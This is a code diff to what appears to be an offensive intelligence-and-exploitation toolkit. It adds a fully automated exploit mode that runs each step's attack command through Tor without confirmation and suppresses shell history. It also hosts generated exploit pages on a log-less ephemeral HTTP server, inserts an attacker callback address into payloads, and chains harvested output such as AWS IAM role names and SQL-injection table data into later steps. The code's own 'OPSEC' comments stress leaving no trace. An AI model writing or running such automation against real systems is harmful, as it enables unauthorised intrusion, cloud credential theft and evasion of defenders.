@@ -339,11 +339,129 @@ class ExploitFileManager:
         """Return display-safe info for a generated file (filename only)."""
         return path.name
 
+    def get_path(self, filename: str) -> Optional[Path]:
+        """Return the full Path for a tracked file by filename."""
+        with self._lock:
+            for path_str, meta in self._files.items():
+                if meta["filename"] == filename:
+                    p = Path(path_str)
+                    if p.exists():
+                        return p
+        return None
+
     def session_destroy(self):
         """Full session teardown: wipe all files and clear tracking."""
         self.wipe_all()
         with self._lock:
             self._files.clear()
+
+
+# ── Ephemeral Exploit HTTP Server ──────────────────────────────────────────
+
+class ExploitServer:
+    """RAM-only HTTP server that auto-serves generated exploit files.
+
+    Spins up a lightweight HTTP server on localhost bound to a random port,
+    serving files exclusively from the ephemeral dir. The server runs in a
+    background thread and auto-stops + wipes on session destroy.
+
+    OPSEC:
+    - Binds to 127.0.0.1 only — never exposed externally
+    - No access logs written to disk
+    - No directory listing — serves only explicitly registered files
+    - Server stops and socket closes on session destroy
+    - All served content is from RAM-backed /dev/shm when available
+    """
+
+    def __init__(self, file_mgr: ExploitFileManager):
+        self._file_mgr = file_mgr
+        self._port = None
+        self._server = None
+        self._thread = None
+        self._served_files: dict = {}  # url_path -> local_path
+        self._lock = threading.Lock()
+        self._running = False
+
+    def _find_free_port(self) -> int:
+        import socket
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind(("127.0.0.1", 0))
+            return s.getsockname()[1]
+
+    def start(self) -> int:
+        """Start the ephemeral HTTP server. Returns the port number."""
+        if self._running:
+            return self._port
+
+        import http.server
+        self._port = self._find_free_port()
+        serve_dir = str(self._file_mgr.base_dir)
+
+        class _SilentHandler(http.server.SimpleHTTPRequestHandler):
+            def __init__(hself, *args, **kwargs):
+                super().__init__(*args, directory=serve_dir, **kwargs)
+
+            def log_message(hself, format, *args):
+                pass  # no access logs
+
+            def do_GET(hself):
+                fname = hself.path.lstrip("/").split("?")[0]
+                full = Path(serve_dir) / fname
+                if not full.exists() or not full.is_file():
+                    hself.send_error(404)
+                    return
+                try:
+                    content = full.read_bytes()
+                    hself.send_response(200)
+                    if fname.endswith(".html"):
+                        hself.send_header("Content-Type", "text/html; charset=utf-8")
+                    elif fname.endswith(".js"):
+                        hself.send_header("Content-Type", "application/javascript")
+                    elif fname.endswith(".json"):
+                        hself.send_header("Content-Type", "application/json")
+                    else:
+                        hself.send_header("Content-Type", "text/plain")
+                    hself.send_header("Content-Length", str(len(content)))
+                    hself.send_header("Cache-Control", "no-store, no-cache")
+                    hself.end_headers()
+                    hself.wfile.write(content)
+                except Exception:
+                    hself.send_error(500)
+
+        from http.server import HTTPServer
+        self._server = HTTPServer(("127.0.0.1", self._port), _SilentHandler)
+        self._thread = threading.Thread(target=self._server.serve_forever,
+                                        daemon=True)
+        self._thread.start()
+        self._running = True
+        return self._port
+
+    def get_url(self, filename: str) -> str:
+        """Get the local serve URL for a generated file."""
+        if not self._running:
+            self.start()
+        return f"http://127.0.0.1:{self._port}/{filename}"
+
+    @property
+    def is_running(self) -> bool:
+        return self._running
+
+    @property
+    def port(self) -> Optional[int]:
+        return self._port
+
+    def stop(self):
+        """Stop the server and close the socket."""
+        if self._server:
+            try:
+                self._server.shutdown()
+                self._server.server_close()
+            except Exception:
+                pass
+        self._running = False
+        self._server = None
+        self._thread = None
+        self._port = None
 
 
 # ── SOC-style Audit Trail ──────────────────────────────────────────────────
@@ -666,6 +784,62 @@ class SafeExecutor:
             return None
         except Exception as e:
             err(f"Execution failed: {type(e).__name__}")
+            self._audit.log_execution(command[:60], vuln_type, exit_code=-1, risk=risk)
+            return None
+
+    def auto_execute(self, command: str, step: dict, vuln_type: str = "",
+                     timeout: int = 30) -> Optional[subprocess.CompletedProcess]:
+        """Execute a command automatically without interactive prompts.
+
+        Used by auto-run mode. Still logs everything to audit trail,
+        still sanitizes env, still enforces timeout and rate limits.
+        Skips confirmation dialogs — the user already confirmed auto mode.
+        """
+        risk = self._assess_risk(command, step)
+
+        if not self._check_rate_limit():
+            warn(f"Rate limit — pausing 5s...")
+            _time_mod.sleep(5)
+            with self._lock:
+                self._exec_times.clear()
+
+        info(f"Auto-executing: {command[:70]}...")
+
+        _safe_env = {k: v for k, v in os.environ.items()
+                     if k not in ("GS_WALLET_PASSWORD", "GS_WALLET_FILE",
+                                  "HIBP_KEY", "DEHASHED_KEY", "DEHASHED_EMAIL",
+                                  "COINGECKO_API_KEY")}
+        _safe_env["HISTFILE"] = "/dev/null"
+
+        try:
+            result = subprocess.run(
+                ["bash", "--norc", "--noprofile", "-c", command],
+                capture_output=True, text=True, timeout=timeout,
+                env=_safe_env,
+            )
+            if result.stdout:
+                print(f"  {G}Output:{N}")
+                for line in result.stdout.strip().split("\n")[:15]:
+                    print(f"    {line}")
+            if result.stderr and result.returncode != 0:
+                print(f"  {Y}Stderr:{N}")
+                for line in result.stderr.strip().split("\n")[:3]:
+                    print(f"    {line}")
+
+            self._audit.log_execution(
+                command[:60], vuln_type,
+                exit_code=result.returncode, risk=risk,
+            )
+            status = f"{G}OK{N}" if result.returncode == 0 else f"{Y}exit {result.returncode}{N}"
+            print(f"  [{status}]")
+            return result
+
+        except subprocess.TimeoutExpired:
+            warn(f"Timed out ({timeout}s)")
+            self._audit.log_execution(command[:60], vuln_type, exit_code=-1, risk=risk)
+            return None
+        except Exception as e:
+            err(f"Failed: {type(e).__name__}")
             self._audit.log_execution(command[:60], vuln_type, exit_code=-1, risk=risk)
             return None
 
@@ -1566,24 +1740,22 @@ def _load_latest_report(ram_dir: Path) -> Optional[dict]:
             return None
 
 
-def _intel_exploit_walkthrough(tor_proxy: str):
-    """Interactive step-by-step exploit walkthrough with full automation.
+def _intel_exploit_walkthrough(tor_proxy: str, auto_mode: bool = False):
+    """Exploit walkthrough with interactive and fully-automated modes.
 
-    Features:
-    - Ephemeral file management (RAM-only, auto-cleanup)
-    - SOC-style audit trail with real-time logging
-    - Safe execution with risk assessment and rate limiting
-    - Comprehensive payload generation for all exploit types
-    - Session report generation and export
-    - Full session wipe on exit
+    auto_mode=False (default): Interactive step-by-step with confirmations.
+    auto_mode=True: Fully automated — runs every step, generates all files,
+      auto-serves HTML exploits via ephemeral HTTP server, captures outputs,
+      chains results into subsequent steps, saves everything, and produces
+      a full session report at the end.
 
-    For each exploitable finding:
-    - Shows the vulnerability details and impact
-    - Presents multi-step PoC with individual step confirmation
-    - Allows custom parameter input and URL overrides
-    - Executes commands through Tor with safety confirmations
-    - Generates exploit files automatically (ephemeral)
-    - Tracks all actions in the audit trail
+    In auto mode the system:
+    1. Generates all exploit HTML/JS files automatically
+    2. Starts an ephemeral HTTP server to serve them
+    3. Executes all verification commands through Tor
+    4. Captures command output and feeds it to next steps
+    5. Produces a comprehensive session report
+    6. Securely wipes everything on exit
     """
 
     ram_dir = Path("/dev/shm/intel") if Path("/dev/shm/intel").exists() else ROOT / ".intel_tmp"
@@ -1604,10 +1776,10 @@ def _intel_exploit_walkthrough(tor_proxy: str):
         info(f"Total findings: {len(vulns)}")
         return
 
-    # ── Initialize session subsystems ──
-    file_mgr = ExploitFileManager(ttl_seconds=300)
+    file_mgr = ExploitFileManager(ttl_seconds=600)
     audit = AuditTrail()
     executor = SafeExecutor(audit, tor_proxy)
+    server = ExploitServer(file_mgr)
 
     if file_mgr.disk_warning:
         print(f"  {R}WARNING: /dev/shm not available — files stored on disk, not RAM.{N}")
@@ -1618,22 +1790,33 @@ def _intel_exploit_walkthrough(tor_proxy: str):
     _proxy_port = urlparse(tor_proxy).port or 9050
     _sp = f"--socks5-hostname 127.0.0.1:{_proxy_port}"
 
-    audit.log("session_start", f"target: {base_url}, findings: {len(exploitable)}")
+    audit.log("session_start", f"target: {base_url}, findings: {len(exploitable)}, "
+              f"mode: {'auto' if auto_mode else 'interactive'}")
 
-    heading("Exploit Walkthrough")
-    print(f"  {B}Session:{N} {audit.session_id}")
+    heading("Exploit Walkthrough" + (" — AUTO MODE" if auto_mode else ""))
+    print(f"  {B}Session:{N}  {audit.session_id}")
+    print(f"  {B}Mode:{N}     {'FULL AUTO — all steps run automatically' if auto_mode else 'Interactive'}")
     print(f"  {B}Findings:{N} {len(exploitable)} exploitable vulnerabilities")
     print(f"  {B}Base URL:{N} {base_url}")
-    print(f"  {B}File TTL:{N} {file_mgr._ttl}s (auto-cleanup)")
     print(f"  {B}Storage:{N}  {'RAM (/dev/shm)' if not file_mgr.disk_warning else 'DISK (no /dev/shm)'}")
     print()
 
-    # Allow target URL override
     custom_url = prompt("Override target URL (or Enter to use detected)", "")
     if custom_url.strip():
         base_url = custom_url.strip()
         audit.log("url_override", f"target changed to: {base_url[:60]}")
         ok(f"Target URL set to: {base_url}")
+        print()
+
+    # In auto mode, also ask for attacker callback once upfront
+    attacker_url = ""
+    if auto_mode:
+        attacker_url = prompt("Attacker callback URL/IP (for payloads)", "").strip()
+        if not attacker_url:
+            port = server.start()
+            attacker_url = f"http://127.0.0.1:{port}"
+            ok(f"Exploit server started on {attacker_url}")
+            audit.log("server_start", f"port: {port}")
         print()
 
     sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
@@ -1649,28 +1832,33 @@ def _intel_exploit_walkthrough(tor_proxy: str):
         print(f"  {i+1:>3}  {color}[{sev:6}]{N}  {etype:20}  {v.get('title', '?')[:45]}")
     print()
 
-    sel = prompt("Enter number to explore (or 'all' for sequential, 'q' to quit)", "all")
-    if sel.lower() in ("q", "quit"):
-        _walkthrough_cleanup(file_mgr, audit, executor)
-        return
-
-    if sel.isdigit():
-        idx = int(sel) - 1
-        if 0 <= idx < len(exploitable):
-            targets = [exploitable[idx]]
-        else:
-            err(f"Invalid number: {sel}")
-            _walkthrough_cleanup(file_mgr, audit, executor)
+    if not auto_mode:
+        sel = prompt("Enter number to explore (or 'all' for sequential, 'q' to quit)", "all")
+        if sel.lower() in ("q", "quit"):
+            _walkthrough_cleanup(file_mgr, audit, executor, server)
             return
+        if sel.isdigit():
+            idx = int(sel) - 1
+            if 0 <= idx < len(exploitable):
+                targets = [exploitable[idx]]
+            else:
+                err(f"Invalid number: {sel}")
+                _walkthrough_cleanup(file_mgr, audit, executor, server)
+                return
+        else:
+            targets = exploitable
     else:
+        if not confirm(f"Run ALL {len(exploitable)} exploits automatically?"):
+            _walkthrough_cleanup(file_mgr, audit, executor, server)
+            return
         targets = exploitable
 
     findings_summary = []
+    chain_data = {}  # accumulated output data from previous steps
 
     for vi, v in enumerate(targets):
         if shutdown_requested():
             break
-
         file_mgr.cleanup_expired()
 
         sev = v.get("severity", "?")
@@ -1708,140 +1896,287 @@ def _intel_exploit_walkthrough(tor_proxy: str):
         print(f"  {B}Exploitation Steps ({len(steps)}):{N}")
         print()
 
-        step_idx = 0
-        action = ""
-        while step_idx < len(steps):
-            if shutdown_requested():
-                break
-            step = steps[step_idx]
-            step_num = step_idx + 1
-
-            print(f"  {G}Step {step_num}/{len(steps)}{N}: {B}{step['title']}{N}")
-            if step.get("warning"):
-                print(f"  {R}WARNING: {step['warning']}{N}")
-            print(f"  {D}Command:{N}")
-            for cmd_line in step["command"].split("\n"):
-                print(f"    {C}{cmd_line}{N}")
-            if step.get("note"):
-                print(f"  {D}Note: {step['note']}{N}")
-            print()
-
-            while True:
-                print(f"    {G}r{N}=run  {G}e{N}=edit+run  {G}s{N}=skip step  "
-                      f"{G}n{N}=next finding  {G}d{N}=download files  "
-                      f"{G}a{N}=audit log  {G}q{N}=quit")
-                action = prompt(f"  Step {step_num}", "r").lower()
-
-                if action in ("q", "quit"):
-                    audit.log("session_end", "user_quit")
-                    _walkthrough_session_end(file_mgr, audit, executor,
-                                            findings_summary)
-                    return
-
-                if action in ("n", "next"):
-                    audit.log_skip(f"finding_{vi+1}_remaining_steps", etype)
-                    break
-
-                if action in ("s", "skip"):
-                    info(f"Skipped step {step_num}")
-                    audit.log_skip(step["title"], etype)
-                    step_idx += 1
-                    break
-
-                if action in ("d", "download"):
-                    _show_tracked_files(file_mgr)
-                    continue
-
-                if action in ("a", "audit"):
-                    _show_live_audit(audit)
-                    continue
-
-                if action in ("r", "run"):
-                    if step.get("generate_file"):
-                        finfo = step["generate_file"]
-                        content = finfo["content"]
-
-                        # Variable substitution for custom target URLs
-                        if "[TARGET_URL]" in content:
-                            custom_target = prompt(
-                                "Target URL for payload", test_url)
-                            content = content.replace("[TARGET_URL]",
-                                                      custom_target)
-                        if "[ATTACKER]" in content:
-                            attacker = prompt(
-                                "Attacker callback URL/IP", "https://ATTACKER")
-                            content = content.replace("[ATTACKER]", attacker)
-                            content = content.replace("https://ATTACKER",
-                                                      attacker)
-
-                        out_path = file_mgr.generate(
-                            exploit_type=etype,
-                            content=content,
-                            custom_name=finfo.get("filename", ""),
-                        )
-                        ok(f"File generated: {out_path.name}")
-                        info(f"Location: intel ephemeral dir (auto-wipes in "
-                             f"{file_mgr._ttl}s)")
-                        if finfo.get("note"):
-                            info(finfo["note"])
-                        audit.log_file_generated(out_path.name, etype)
-                        print()
-                        step_idx += 1
-                        break
-
-                    cmd = step["command"]
-                    if cmd.startswith("#") or cmd.startswith("<!--"):
-                        info("This step is informational (no executable command).")
-                        audit.log("info_step", step["title"], vuln_type=etype)
-                        step_idx += 1
-                        break
-
-                    # Variable substitution in commands
-                    if "[ATTACKER]" in cmd:
-                        attacker = prompt("Attacker IP/domain for callback",
-                                          "ATTACKER")
-                        cmd = cmd.replace("[ATTACKER]", attacker)
-                        cmd = cmd.replace("ATTACKER", attacker)
-
-                    result = executor.execute(cmd, step, vuln_type=etype)
-                    if result is not None:
-                        ok(f"Step {step_num} complete")
-                    print()
-                    step_idx += 1
-                    break
-
-                if action in ("e", "edit"):
-                    default_cmd = step["command"].split("\n")[0]
-                    if default_cmd.startswith("#"):
-                        default_cmd = ""
-                    custom = prompt("Enter command to execute", default_cmd)
-                    if not custom or custom.startswith("#"):
-                        info("No executable command entered — skipping step")
-                        audit.log_skip(f"edit_empty:{step['title']}", etype)
-                        step_idx += 1
-                        break
-                    if not confirm(f"Execute: {custom[:80]}... ?"):
-                        continue
-
-                    audit.log_edit_run(custom[:60], etype)
-                    result = executor.execute(custom, step, vuln_type=etype)
-                    step_idx += 1
-                    break
-
-            if action in ("n", "next"):
-                continue
+        if auto_mode:
+            _run_steps_auto(steps, etype, test_url, executor, file_mgr,
+                            server, audit, chain_data, attacker_url, _sp)
+        else:
+            _run_steps_interactive(steps, etype, test_url, vi, executor,
+                                   file_mgr, audit, findings_summary)
 
         if len(targets) > 1 and vi < len(targets) - 1:
             print()
-            # Show mini status between findings
             stats = audit.get_stats()
             print(f"  {D}[Session: {stats['executions']} executed, "
                   f"{stats['files_generated']} files, "
                   f"{stats['skips']} skipped]{N}")
-            if not confirm("Continue to next finding?"):
+            if not auto_mode:
+                if not confirm("Continue to next finding?"):
+                    break
+            else:
+                _time_mod.sleep(0.5 + secrets.randbelow(2))
+
+    _walkthrough_session_end(file_mgr, audit, executor, findings_summary,
+                             server)
+
+
+def _run_steps_auto(steps: list, etype: str, test_url: str,
+                    executor: SafeExecutor, file_mgr: ExploitFileManager,
+                    server: ExploitServer, audit: AuditTrail,
+                    chain_data: dict, attacker_url: str, sp: str):
+    """Fully automated step execution — no user interaction per step.
+
+    For each step:
+    - generate_file steps: creates file, auto-serves it, logs the serve URL
+    - executable commands: auto-runs through Tor, captures output
+    - informational steps: logs and moves on
+    - output from each step is captured and made available to subsequent steps
+    """
+    for step_idx, step in enumerate(steps):
+        if shutdown_requested():
+            break
+
+        step_num = step_idx + 1
+        print(f"  {G}[AUTO {step_num}/{len(steps)}]{N} {B}{step['title']}{N}")
+
+        # ── File generation steps ──
+        if step.get("generate_file"):
+            finfo = step["generate_file"]
+            content = finfo["content"]
+
+            # Auto-substitute variables
+            content = content.replace("[TARGET_URL]", test_url)
+            if attacker_url:
+                content = content.replace("[ATTACKER]", attacker_url)
+                content = content.replace("https://ATTACKER", attacker_url)
+                content = content.replace("ATTACKER", attacker_url)
+
+            fname = finfo.get("filename", f"{etype}_{secrets.token_hex(3)}.html")
+            out_path = file_mgr.generate(
+                exploit_type=etype, content=content, custom_name=fname,
+            )
+
+            serve_url = server.get_url(out_path.name)
+
+            ok(f"Generated: {out_path.name}")
+            ok(f"Serving at: {serve_url}")
+            if finfo.get("note"):
+                info(finfo["note"])
+
+            audit.log_file_generated(out_path.name, etype)
+            audit.log("auto_serve", f"serving: {out_path.name} at :{server.port}",
+                      vuln_type=etype)
+
+            chain_data[f"{etype}_file"] = out_path.name
+            chain_data[f"{etype}_url"] = serve_url
+            chain_data["last_file"] = out_path.name
+            chain_data["last_serve_url"] = serve_url
+            print()
+            continue
+
+        cmd = step["command"]
+
+        # Skip commented-out / informational steps
+        if cmd.startswith("#") or cmd.startswith("<!--"):
+            info(f"Info: {step.get('note', step['title'])}")
+            audit.log("info_step", step["title"], vuln_type=etype)
+            print()
+            continue
+
+        # Auto-substitute variables in commands
+        if attacker_url:
+            cmd = cmd.replace("[ATTACKER]", attacker_url)
+            cmd = cmd.replace("ATTACKER", attacker_url)
+        cmd = cmd.replace("[TARGET_URL]", test_url)
+
+        # Feed chain data: replace [ROLE_NAME] etc from previous outputs
+        for key, val in chain_data.items():
+            placeholder = f"[{key.upper()}]"
+            if placeholder in cmd:
+                cmd = cmd.replace(placeholder, str(val))
+
+        if step.get("warning"):
+            print(f"  {Y}Warning: {step['warning']}{N}")
+
+        # Jittered delay between commands
+        _time_mod.sleep(0.3 + secrets.randbelow(2000) / 1000.0)
+
+        result = executor.auto_execute(cmd, step, vuln_type=etype)
+
+        # Capture output for chaining to next steps
+        if result and result.stdout:
+            output = result.stdout.strip()
+            chain_data["last_output"] = output
+            chain_data[f"{etype}_output_{step_idx}"] = output
+
+            # Auto-extract useful data from output
+            _auto_extract_chain_data(output, etype, chain_data)
+
+        print()
+
+
+def _auto_extract_chain_data(output: str, etype: str, chain_data: dict):
+    """Parse command output and extract data for chaining to next steps."""
+    import re as _re
+
+    # Extract IAM role names from AWS metadata
+    if etype == "ssrf" and "arn:aws" not in output:
+        lines = [l.strip() for l in output.split("\n") if l.strip() and not l.startswith("===")]
+        if lines and len(lines) == 1 and " " not in lines[0]:
+            chain_data["ROLE_NAME"] = lines[0]
+
+    # Extract DB version
+    if etype == "sqli":
+        for pattern in [r"(\d+\.\d+\.\d+[-\w]*)", r"(MariaDB|PostgreSQL|SQLite)\s+[\d.]+"]:
+            m = _re.search(pattern, output)
+            if m:
+                chain_data["db_version"] = m.group(0)
                 break
 
-    _walkthrough_session_end(file_mgr, audit, executor, findings_summary)
+    # Extract column count from ORDER BY
+    if "ORDER BY" in chain_data.get("last_output", ""):
+        numbers = _re.findall(r"ORDER BY (\d+)", output)
+        if numbers:
+            chain_data["column_count"] = max(int(n) for n in numbers)
+
+    # Extract table names
+    tables = _re.findall(r"(?:Table|table):\s*(\w+)", output)
+    if tables:
+        chain_data["tables"] = tables
+
+    # Generic: capture anything that looks like a key=value
+    for line in output.split("\n"):
+        if ":" in line and len(line) < 200:
+            parts = line.split(":", 1)
+            key = parts[0].strip().lower().replace(" ", "_")[:30]
+            val = parts[1].strip()[:100]
+            if key and val and not any(c in key for c in "/<>{}"):
+                chain_data[f"extracted_{key}"] = val
+
+
+def _run_steps_interactive(steps: list, etype: str, test_url: str,
+                           vi: int, executor: SafeExecutor,
+                           file_mgr: ExploitFileManager,
+                           audit: AuditTrail,
+                           findings_summary: list):
+    """Interactive step-by-step execution with user confirmations."""
+    step_idx = 0
+    action = ""
+    while step_idx < len(steps):
+        if shutdown_requested():
+            break
+        step = steps[step_idx]
+        step_num = step_idx + 1
+
+        print(f"  {G}Step {step_num}/{len(steps)}{N}: {B}{step['title']}{N}")
+        if step.get("warning"):
+            print(f"  {R}WARNING: {step['warning']}{N}")
+        print(f"  {D}Command:{N}")
+        for cmd_line in step["command"].split("\n"):
+            print(f"    {C}{cmd_line}{N}")
+        if step.get("note"):
+            print(f"  {D}Note: {step['note']}{N}")
+        print()
+
+        while True:
+            print(f"    {G}r{N}=run  {G}e{N}=edit+run  {G}s{N}=skip step  "
+                  f"{G}n{N}=next finding  {G}d{N}=download files  "
+                  f"{G}a{N}=audit log  {G}q{N}=quit")
+            action = prompt(f"  Step {step_num}", "r").lower()
+
+            if action in ("q", "quit"):
+                audit.log("session_end", "user_quit")
+                return
+
+            if action in ("n", "next"):
+                audit.log_skip(f"finding_{vi+1}_remaining_steps", etype)
+                break
+
+            if action in ("s", "skip"):
+                info(f"Skipped step {step_num}")
+                audit.log_skip(step["title"], etype)
+                step_idx += 1
+                break
+
+            if action in ("d", "download"):
+                _show_tracked_files(file_mgr)
+                continue
+
+            if action in ("a", "audit"):
+                _show_live_audit(audit)
+                continue
+
+            if action in ("r", "run"):
+                if step.get("generate_file"):
+                    finfo = step["generate_file"]
+                    content = finfo["content"]
+
+                    if "[TARGET_URL]" in content:
+                        custom_target = prompt(
+                            "Target URL for payload", test_url)
+                        content = content.replace("[TARGET_URL]",
+                                                  custom_target)
+                    if "[ATTACKER]" in content:
+                        attacker = prompt(
+                            "Attacker callback URL/IP", "https://ATTACKER")
+                        content = content.replace("[ATTACKER]", attacker)
+                        content = content.replace("https://ATTACKER",
+                                                  attacker)
+
+                    out_path = file_mgr.generate(
+                        exploit_type=etype,
+                        content=content,
+                        custom_name=finfo.get("filename", ""),
+                    )
+                    ok(f"File generated: {out_path.name}")
+                    info(f"Location: intel ephemeral dir (auto-wipes in "
+                         f"{file_mgr._ttl}s)")
+                    if finfo.get("note"):
+                        info(finfo["note"])
+                    audit.log_file_generated(out_path.name, etype)
+                    print()
+                    step_idx += 1
+                    break
+
+                cmd = step["command"]
+                if cmd.startswith("#") or cmd.startswith("<!--"):
+                    info("This step is informational (no executable command).")
+                    audit.log("info_step", step["title"], vuln_type=etype)
+                    step_idx += 1
+                    break
+
+                if "[ATTACKER]" in cmd:
+                    attacker = prompt("Attacker IP/domain for callback",
+                                      "ATTACKER")
+                    cmd = cmd.replace("[ATTACKER]", attacker)
+                    cmd = cmd.replace("ATTACKER", attacker)
+
+                result = executor.execute(cmd, step, vuln_type=etype)
+                if result is not None:
+                    ok(f"Step {step_num} complete")
+                print()
+                step_idx += 1
+                break
+
+            if action in ("e", "edit"):
+                default_cmd = step["command"].split("\n")[0]
+                if default_cmd.startswith("#"):
+                    default_cmd = ""
+                custom = prompt("Enter command to execute", default_cmd)
+                if not custom or custom.startswith("#"):
+                    info("No executable command entered — skipping step")
+                    audit.log_skip(f"edit_empty:{step['title']}", etype)
+                    step_idx += 1
+                    break
+                if not confirm(f"Execute: {custom[:80]}... ?"):
+                    continue
+
+                audit.log_edit_run(custom[:60], etype)
+                result = executor.execute(custom, step, vuln_type=etype)
+                step_idx += 1
+                break
+
+        if action in ("n", "next"):
+            continue
 
 
 def _show_tracked_files(file_mgr: ExploitFileManager):
@@ -1892,7 +2227,8 @@ def _show_live_audit(audit: AuditTrail):
 def _walkthrough_session_end(file_mgr: ExploitFileManager,
                              audit: AuditTrail,
                              executor: SafeExecutor,
-                             findings_summary: list):
+                             findings_summary: list,
+                             server: ExploitServer = None):
     """End-of-session: show stats, offer report, then wipe everything."""
     print()
     heading("Session Complete")
@@ -1906,7 +2242,23 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
     print(f"  {B}Custom commands:{N} {stats['edits']}")
     print(f"  {B}High-risk alerts:{N} {stats['alerts']}")
     print(f"  {B}Vuln types:{N}      {', '.join(stats['vuln_types_tested'])}")
+    if server and server.is_running:
+        print(f"  {B}Exploit server:{N} running on :{server.port}")
     print()
+
+    # Show generated files summary
+    tracked = file_mgr.list_files()
+    if tracked:
+        active = [f for f in tracked if f["exists"]]
+        if active:
+            print(f"  {B}Generated Exploit Files ({len(active)}):{N}")
+            for f in active:
+                serve_info = ""
+                if server and server.is_running:
+                    serve_info = f"  {D}→ {server.get_url(f['filename'])}{N}"
+                print(f"    {G}●{N} {f['filename']:30s} {f['type']:12s} "
+                      f"{f['size_bytes']:>5d}B{serve_info}")
+            print()
 
     alerts = audit.get_alerts()
     if alerts:
@@ -1915,7 +2267,6 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
             print(f"    [{a['ts_iso']}] {a['action']}: {a.get('detail', '')[:50]}")
         print()
 
-    # Offer report export
     if confirm("Generate session report?"):
         fmt = prompt("Format (text/json)", "text").lower()
         if fmt not in ("text", "json"):
@@ -1935,15 +2286,20 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
             print(report_content)
             print()
 
-    # Session cleanup
-    _walkthrough_cleanup(file_mgr, audit, executor)
+    _walkthrough_cleanup(file_mgr, audit, executor, server)
 
 
 def _walkthrough_cleanup(file_mgr: ExploitFileManager,
                          audit: AuditTrail,
-                         executor: SafeExecutor):
-    """Securely destroy all session data."""
+                         executor: SafeExecutor,
+                         server: ExploitServer = None):
+    """Securely destroy all session data — files, server, audit, memory."""
     print()
+    if server and server.is_running:
+        info("Stopping exploit server...")
+        server.stop()
+        ok("Exploit server stopped")
+
     tracked = file_mgr.list_files()
     if tracked:
         active = [f for f in tracked if f["exists"]]
@@ -2771,12 +3127,13 @@ def flow_intel(detected_port=None):
     print(f"    {G}2{N}  Email Breach Check           (check breach databases)")
     print(f"    {G}3{N}  Search Query OSINT           (search + scrape)")
     print(f"    {G}4{N}  Batch Targets from File      (one target per line)")
-    print(f"    {G}5{N}  Exploit Walkthrough          (review + verify + exploit findings)")
+    print(f"    {G}5{N}  Exploit Walkthrough          (step-by-step interactive)")
+    print(f"    {G}5a{N} Auto Exploit                 (fully automated — runs everything)")
     print(f"    {G}6{N}  View Reports                 (read saved scan results)")
     print(f"    {G}7{N}  Wipe Intel Data              (secure erase from RAM)")
     print(f"    {G}8{N}  Manage Exploit Files         (view/wipe ephemeral files)")
     print()
-    mode = prompt("Choose mode (1-8)")
+    mode = prompt("Choose mode (1-8, 5a)")
 
     if mode == "8":
         heading("Exploit File Management")
@@ -2903,11 +3260,27 @@ def flow_intel(detected_port=None):
                 err(f"Invalid choice: {choice_str}")
         return
 
-    if mode == "5":
+    if mode in ("5", "5a"):
         tor = get_tor_proxy(detected_port)
         if not tor:
             return
-        _intel_exploit_walkthrough(tor)
+        auto = mode == "5a"
+        if auto:
+            print()
+            print(f"  {R}{'=' * 55}{N}")
+            print(f"  {R}  AUTO EXPLOIT MODE{N}")
+            print(f"  {R}{'=' * 55}{N}")
+            print(f"  This will automatically:")
+            print(f"    1. Generate all exploit files (clickjack, CSRF, etc.)")
+            print(f"    2. Start an ephemeral HTTP server to host them")
+            print(f"    3. Execute all verification commands through Tor")
+            print(f"    4. Capture outputs and chain them to next steps")
+            print(f"    5. Produce a full session report")
+            print(f"    6. Securely wipe everything on exit")
+            print()
+            if not confirm("Proceed with full auto exploit?"):
+                return
+        _intel_exploit_walkthrough(tor, auto_mode=auto)
         return
 
     tor = get_tor_proxy(detected_port)
@@ -2947,11 +3320,18 @@ def flow_intel(detected_port=None):
                 if "=" in ck:
                     args.extend(["--cookie", ck])
         if run_script(INTEL / "testergatherSystem", args, "Intel scan"):
-            # After scan, offer exploit walkthrough if deep scan
             if depth == "deep":
                 print()
-                if confirm("Review exploitable findings interactively?"):
-                    _intel_exploit_walkthrough(tor)
+                print(f"  {B}Post-scan options:{N}")
+                print(f"    {G}1{N}  Interactive walkthrough  (step-by-step)")
+                print(f"    {G}2{N}  Auto exploit             (fully automated)")
+                print(f"    {G}3{N}  Skip")
+                print()
+                post = prompt("Choose", "1")
+                if post == "1":
+                    _intel_exploit_walkthrough(tor, auto_mode=False)
+                elif post == "2":
+                    _intel_exploit_walkthrough(tor, auto_mode=True)
 
     elif mode == "2":
         email = prompt("Email address to check")
